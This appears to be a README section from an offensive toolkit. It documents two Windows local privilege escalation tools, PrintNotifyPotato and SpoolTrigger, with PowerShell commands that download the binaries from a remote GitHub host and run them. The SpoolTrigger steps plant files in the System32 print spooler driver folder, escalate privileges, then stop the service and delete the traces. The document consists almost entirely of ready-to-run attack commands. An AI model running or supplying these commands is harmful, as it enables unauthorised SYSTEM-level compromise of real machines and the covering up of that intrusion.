## PrintNotifyPotato-NET2.exe

|Function name|Description|Privileges|Screenshot|
|---|---|---|---|
|PrintNotifyPotato-NET2|Local privilege escalation|Administrator|[PrintNotifyPotato](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/LPE.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/PrintNotifyPotato-NET2.exe" -OutFile "PrintNotifyPotato-NET2.exe"
```

<br />

**execute:**
```powershell
.\PrintNotifyPotato-NET2.exe whoami
.\PrintNotifyPotato-NET2.exe cmd interactive
```

<br />

## SpoolTrigger.ps1

|Function name|Description|Privileges|Screenshot|Credits|
|---|---|---|---|---|
|SpoolTrigger|Local privilege escalation|Administrator|[SpoolTrigger](https://user-images.githubusercontent.com/23490060/222120179-ae2e2b14-fe3e-453e-a494-dcf1c84dd270.jpg)|@404death|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/bin.zip" -OutFile "$Env:TMP\bin.zip"
```

<br />

**execute:**
```powershell
# Expand ZIP archive
Expand-Archive -Path "$Env:TMP\bin.Zip" -DestinationPath "$Env:TMP" -force
cd "$Env:TMP\bin"

# Move files to comrrespondent directory
Move-Item -Path "*" -Destination "$Env:WINDIR\System32\spool\drivers\x64\3\" -Force
cd "$Env:WINDIR\System32\spool\drivers\x64\3\bin"
.\SpoolTrigger.ps1
whoami

# CleanUp
Stop-Service -Name "PrintNotify" -Force
Remove-Item -Path "$Env:TMP\bin" -Force
Remove-Item -Path "$Env:TMP\bin.zip" -Force
Remove-Item -Path "$Env:WINDIR\System32\spool\drivers\x64\3\bin" -Force
```
